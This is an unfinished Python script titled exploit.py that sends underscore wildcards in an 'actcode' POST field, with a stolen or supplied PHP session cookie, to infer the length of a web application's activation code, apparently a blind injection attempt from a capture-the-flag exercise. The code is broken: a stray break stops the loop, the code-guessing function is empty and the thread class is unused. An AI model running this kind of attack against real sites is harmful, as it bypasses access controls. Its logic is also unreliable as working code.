import requests
import re
import sys
import threading
import string

chars=list(string.ascii_lowercase + string.ascii_uppercase + string.digits)

class CodeThread(threading.Thread):
    def __init__(self, threadID, name, url, sessid):
        threading.Thread.__init__(self)
        self.threadID=threadID
        self.name=name
        self.url=url
        self.code=""
        self.sessid=sessid

    def run(self):
        self.code=getCode(self.url,self.sessid)

def getCodeLength(url,sessid):
    inv=b'\x43\x6f\x64\x65\x20\x69\x73\x20\x69\x6e\x76\x61\x6c\x69\x64\x2e'
    l=0
    query=""
    while True:
        query=query+"_"
        postData={"actcode":query, "submit" : "Submit"}
        print(postData)
        match=re.search("invalid",requests.post(url,data=postData,headers={"Cookie":"PHPSESSID="+sessid},stream=True).text)
        r=requests.post(url,data=query,headers={"Cookie":"PHPSESSID="+sessid},stream=True)
        print(r.raw.read(200000))
        break
        if(match):
            l=l+1
            print(l)
        else:
            return l

def getCode(url,sessid):
    return ""


if(len(sys.argv) < 3):
    sys.exit("Usage: python exploit.py <url> <sessid>")

url=sys.argv[1]
sessid=sys.argv[2]
print(getCodeLength(url,sessid))